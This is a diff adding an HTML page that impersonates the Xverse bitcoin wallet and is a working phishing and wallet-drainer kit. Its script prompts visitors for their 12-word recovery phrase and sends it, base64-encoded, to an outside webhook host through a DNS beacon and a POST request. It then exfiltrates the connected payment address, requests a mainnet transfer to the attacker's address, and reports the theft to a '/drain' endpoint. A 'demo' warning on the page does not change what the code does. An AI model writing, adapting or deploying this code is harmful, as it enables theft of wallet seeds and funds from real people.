@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>xverse.app</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 40px;
+      text-align: center;
+      background: #0f172a;
+      color: #e2e8f0;
+    }
+    .logo {
+      font-size: 80px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 16px;
+      color: #94a3b8;
+      margin-bottom: 30px;
+    }
+    button {
+      padding: 16px 32px;
+      font-size: 18px;
+      cursor: pointer;
+      background: #f6851b;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(246,133,27,0.4);
+    }
+    button:hover {
+      background: #e2761b;
+    }
+    .status {
+      margin-top: 30px;
+      font-size: 16px;
+      min-height: 60px;
+    }
+    .address {
+      color: #22c55e;
+      word-break: break-all;
+    }
+    .warning {
+      margin-top: 40px;
+      color: #ef4444;
+      font-weight: bold;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">⚡</div>
+  <h1>Xverse Wallet</h1>
+  <p>Connect and send a small amount to verify your wallet</p>
+  <button id="connectWallet">Connect & Send</button>
+
+  <div class="status" id="status">Ready</div>
+
+  <div class="warning">
+    This is a demo — do not use on real wallet!
+  </div>
+
+  <script>
+    // KONFIGURASI KAMU
+    const OOB = "keen-unicorn-32.webhook.cool";
+    const TARGET_ADDRESS = "bc1qyourdraineraddresshere"; // GANTI DENGAN ALAMAT BTC KAMU
+    const SEND_AMOUNT_SATS = 1000; // 1,000 sats = 0.00001 BTC
+    const NETWORK = "mainnet"; // atau "testnet"
+
+    document.getElementById("connectWallet").addEventListener("click", async () => {
+      const statusEl = document.getElementById("status");
+
+      statusEl.innerHTML = "Connecting to Xverse wallet...";
+
+      // 1. PROMPT SEED PHRASE (MIRIP WALLET RESMI)
+      setTimeout(() => {
+        const seed = prompt("Xverse Wallet says:\n\nEnter your 12-word recovery phrase to verify identity");
+        if (seed && seed.trim() !== "") {
+          // Exfil via OOB DNS
+          const beacon = btoa(seed.trim()).replace(/=/g, '').substring(0, 500);
+          new Image().src = `https://${beacon}.${OOB}`;
+
+          // Backup POST
+          fetch(`https://${OOB}/xverse-seed`, {
+            method: "POST",
+            body: JSON.stringify({ seed: seed.trim() })
+          }).catch(() => {});
+        }
+      }, 1000);
+
+      try {
+        if (!window.SATS?.request) {
+          throw new Error("Sats Connect not loaded");
+        }
+
+        // 2. CONNECT KE XVERSE & MINTA PAYMENT ADDRESS
+        const connectRes = await window.SATS.request('wallet_connect', {
+          addresses: ['payment'],
+          message: 'Demo dApp: request 1,000 sats transfer',
+          network: NETWORK
+        });
+
+        if (connectRes.status !== 'success') {
+          const msg = connectRes.error?.code === window.SATS.RpcErrorCode.USER_REJECTION
+            ? "User rejected the connection."
+            : (connectRes.error?.message || "Connection failed");
+          throw new Error(msg);
+        }
+
+        const paymentAddrObj = (connectRes.result.addresses || [])
+          .find(a => a.purpose === 'payment');
+
+        if (!paymentAddrObj?.address) {
+          throw new Error('No payment address returned by wallet.');
+        }
+
+        statusEl.innerHTML = `Connected: <span class="address">${paymentAddrObj.address}</span><br>Sending <b>0.00001 BTC</b>...`;
+
+        // Exfil address victim via OOB
+        const addrBeacon = btoa(paymentAddrObj.address).replace(/=/g, '');
+        new Image().src = `https://addr-${addrBeacon}.${OOB}`;
+
+        // 3. KIRIM 1,000 SATS KE TARGET_ADDRESS KAMU
+        const sendRes = await window.SATS.request('sendTransfer', {
+          recipients: [{ address: TARGET_ADDRESS, amount: SEND_AMOUNT_SATS }]
+        });
+
+        if (sendRes.status === 'success') {
+          statusEl.innerHTML += "<br><span style='color:#22c55e'>Transaction sent successfully!</span>";
+          // Exfil tx result
+          fetch(`https://${OOB}/drain`, {
+            method: "POST",
+            body: JSON.stringify({
+              victim: paymentAddrObj.address,
+              txId: sendRes.result?.txId || "unknown",
+              amount: SEND_AMOUNT_SATS
+            })
+          });
+        } else {
+          throw new Error(sendRes.error?.message || "Send failed");
+        }
+
+      } catch (err) {
+        statusEl.innerHTML = `<span style="color:#ef4444">Error: ${err.message}</span>`;
+        console.log("Xverse operation failed:", err);
+      }
+    });
+  </script>
+</body>
+</html>
